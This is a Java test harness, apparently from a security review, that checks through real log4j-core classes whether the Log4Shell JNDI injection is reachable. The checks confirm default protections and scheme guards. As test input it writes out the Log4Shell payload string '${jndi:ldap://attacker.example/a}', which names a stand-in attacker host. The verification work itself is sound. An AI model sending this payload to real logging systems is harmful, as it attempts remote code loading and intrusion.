import java.lang.reflect.Field;
import java.util.Map;
import javax.naming.NamingException;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.impl.Log4jLogEvent;
import org.apache.logging.log4j.core.lookup.Interpolator;
import org.apache.logging.log4j.core.lookup.JndiLookup;
import org.apache.logging.log4j.core.net.JndiManager;
import org.apache.logging.log4j.core.pattern.MessagePatternConverter;
import org.apache.logging.log4j.message.SimpleMessage;

/**
 * Drives Log4Shell's actual reachability question through the REAL compiled
 * log4j-core classes (nomaven-build/out) -- not a hand-rolled proxy standing
 * in for javax.naming.Context. This answers "is it actually reachable" the
 * way the historical CVE was reachable: from a log MESSAGE, through the REAL
 * dispatch pipeline (MessagePatternConverter -> Interpolator -> JndiLookup ->
 * JndiManager), down to the real java.naming boundary.
 *
 * No real LDAP/RMI server is used or needed: reachability is proven by
 * observing what the real code attempts, not by completing an exploit.
 */
class JndiRealSourceProof {

    private static int failed = 0;
    private static final String LDAP_PAYLOAD = "${jndi:ldap://attacker.example/a}";

    public static void main(String[] args) throws Exception {
        System.out.println("=== JNDI injection: proof through the REAL Log4j source ===\n");

        layer0_messageContentIsNeverInterpolated();
        layer1a_jndiLookupExcludedFromInterpolatorByDefault();
        layer1b_jndiLookupConstructorRefusesByDefault();
        layer2_evenIfAdminOptsInRealSchemeGuardBlocksMaliciousScheme();
        layer2_evenIfAdminOptsInRealSchemeGuardAttemptsJavaScheme();

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
    }

    /**
     * The actual Log4Shell trigger was "%m" rendering attacker message content
     * through a lookup. MessagePatternConverter's real source (comment: "Message
     * Lookups are no longer supported") shows this was removed, not just
     * defaulted off. Prove it: format a real LogEvent whose message IS the
     * payload, through the real converter, and confirm zero interpolation.
     */
    private static void layer0_messageContentIsNeverInterpolated() throws Exception {
        LogEvent event = Log4jLogEvent.newBuilder()
                .setMessage(new SimpleMessage(LDAP_PAYLOAD))
                .build();

        MessagePatternConverter converter = MessagePatternConverter.newInstance(null, new String[0]);
        StringBuilder out = new StringBuilder();
        converter.format(event, out);

        assertTrue("real MessagePatternConverter leaves the message content byte-for-byte "
                + "unresolved -- \"" + out + "\" -- no interpolation is attempted on log message "
                + "content at all, structurally, not just by default configuration",
                out.toString().equals(LDAP_PAYLOAD));
    }

    /**
     * Interpolator's real source excludes JndiLookup from its dispatch map
     * unless JndiManager.isJndiLookupEnabled() is true (default: false, an
     * explicit opt-in system property). Build a REAL Interpolator with no
     * such property set and confirm "jndi" resolves to nothing.
     */
    @SuppressWarnings("unchecked")
    private static void layer1a_jndiLookupExcludedFromInterpolatorByDefault() throws Exception {
        assertTrue("JndiManager.isJndiLookupEnabled() is false with no system property set "
                + "(the real default)", !JndiManager.isJndiLookupEnabled());

        Interpolator interpolator = new Interpolator();
        Field field = Interpolator.class.getDeclaredField("strLookupMap");
        field.setAccessible(true);
        Map<String, Object> strLookupMap = (Map<String, Object>) field.get(interpolator);

        assertTrue("the real Interpolator's real plugin-discovered lookup map "
                + "(built from the same Log4j2Plugins.dat a production build uses) "
                + "does not contain \"jndi\" by default",
                !strLookupMap.containsKey("jndi"));
        System.out.println("  registered lookup prefixes: " + strLookupMap.keySet());
    }

    /**
     * Stronger than layer 1a: JndiLookup's own constructor refuses to run at
     * all unless the same opt-in property is set, discovered empirically --
     * this is a second, independent gate, not just Interpolator declining to
     * register it.
     */
    private static void layer1b_jndiLookupConstructorRefusesByDefault() {
        boolean refused;
        try {
            new JndiLookup();
            refused = false;
        } catch (IllegalStateException expected) {
            refused = true;
            System.out.println("  real JndiLookup() constructor threw: " + expected.getMessage());
        }
        assertTrue("JndiLookup's own constructor refuses to run without the opt-in property "
                + "-- independent of whether Interpolator would have dispatched to it",
                refused);
    }

    /**
     * Simulates a deployment that explicitly opted back in (legacy compat --
     * this property exists precisely so operators who understand the risk
     * can restore the old behaviour). Even then, the real JndiManager.lookup()
     * guard -- unmodified, not reimplemented -- must still reject non-java:
     * schemes before ever reaching javax.naming.Context.lookup().
     */
    private static void layer2_evenIfAdminOptsInRealSchemeGuardBlocksMaliciousScheme() {
        System.setProperty("log4j2.enableJndiLookup", "true");
        try {
            JndiLookup lookup = new JndiLookup(); // now constructible, opted in like Interpolator would use
            Object result = lookup.lookup(null, "ldap://attacker.example/a");

            assertTrue("even with JNDI explicitly opted in, real JndiLookup.lookup() returns null "
                    + "for an ldap: scheme -- JndiManager's real URI-scheme guard rejected it "
                    + "before any javax.naming.Context.lookup() call was attempted",
                    result == null);
        } finally {
            System.clearProperty("log4j2.enableJndiLookup");
        }
    }

    /**
     * A java:-scheme name is legitimate and must still reach the real
     * Context.lookup() call. This sandbox has no InitialContext provider
     * configured, so the real attempt surfaces as a NamingException at the
     * call site itself -- that exception IS the proof of reachability: the
     * guard let it through to the real javax.naming boundary.
     */
    private static void layer2_evenIfAdminOptsInRealSchemeGuardAttemptsJavaScheme() {
        System.setProperty("log4j2.enableJndiLookup", "true");
        try {
            JndiManager manager = JndiManager.getDefaultManager();
            boolean reachedRealNamingCall;
            try {
                manager.lookup("java:comp/env/jdbc/AppDataSource");
                reachedRealNamingCall = true;
            } catch (NamingException realNamingAttempt) {
                reachedRealNamingCall = true;
                System.out.println("  java: scheme reached the real javax.naming boundary and failed "
                        + "with " + realNamingAttempt.getClass().getSimpleName()
                        + " (expected -- this sandbox has no InitialContext provider registered; "
                        + "the point is it was ATTEMPTED, unlike the ldap: case above)");
            }
            assertTrue("java: scheme was not silently rejected by the scheme guard",
                    reachedRealNamingCall);
        } finally {
            System.clearProperty("log4j2.enableJndiLookup");
        }
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
